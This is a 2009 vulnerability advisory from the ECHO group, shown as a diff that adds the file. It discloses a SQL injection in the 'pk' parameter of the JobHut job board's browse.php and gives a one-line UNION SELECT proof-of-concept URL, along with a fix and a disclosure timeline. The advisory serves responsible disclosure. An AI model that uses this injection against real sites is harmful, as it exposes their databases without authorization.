@@ -1,0 +1,90 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_108$2009
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_108$2009] JobHut <= 1.2 (pk) Remote Sql Injection Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author       : K-159
+Date         : March, 30 th 2009
+Location     : Jakarta, Indonesia
+Web          : http://e-rdc.org/v1/news.php?readmore=132
+Critical Lvl : Moderate
+Impact       : Exposure of sensitive information
+Where        : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application : JobHut
+version     : <= 1.2
+Vendor      : http://jobhut.spranger.us/
+Description :
+
+
+JobHut is an open source job board solution.
+
+--------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~
+
+Input passed to the "pk" parameter in browse.php page is not properly verified before being used 
+into sql queries.This vulnerability can be exploited to manipulate SQL queries by injecting arbitrary SQL code.
+
+Poc/Exploit:
+~~~~~~~
+
+http://www.example.com/[path]/browse.php?pk=-1 union select @@version,2--
+
+
+Dork:
+~~~
+Google : N/A
+
+
+Solution:
+~~~~~
+- Edit the source code to ensure that input is properly verified.
+
+Timeline:
+~~~~~~~
+
+- 21 - 03 - 2009 bug found
+- 26 - 03 - 2009 vendor contacted
+- 26 - 03 - 2009 vendor response
+- 30 - 03 - 2009 advisory release
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~
+~ ping - my dearest wife, zizau - my beloved son, i-eyes - my beloved daughter.
+~ y3dips,the_day,Negatif,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v,az001,
+the_hydra,neng chika, str0ke
+~ scanners [at] SCAN-NUSANTARA and SCAN-ASSOCIATES
+~ SK,Abond,pokley,cybertank, super_temon,whatsoever,b120t0,inggar,fachri,adi,rahmat,indra
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,cyb3rh3b,cR4SH3R,ogeb,bagan,devsheed
+~ dr188le,cow_1seng,poniman_coy,paman_gembul,ketut,rizal,ghostblup,shamus,
+kuntua, stev_manado,nofry,k1tk4t,0pt1c
+~ newbie_hacker@yahoogroups.com
+~ milw0rm.com, macaholic.info, unitiga.com, mac.web.id, indowebster.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~
+
+K-159 || echo|staff || adv[at]e-rdc[dot]org
+Homepage: http://www.e-rdc.org/
+
+-------------------------------- [ EOF ] ---------------------------------- 
+
+# milw0rm.com [2009-03-30]
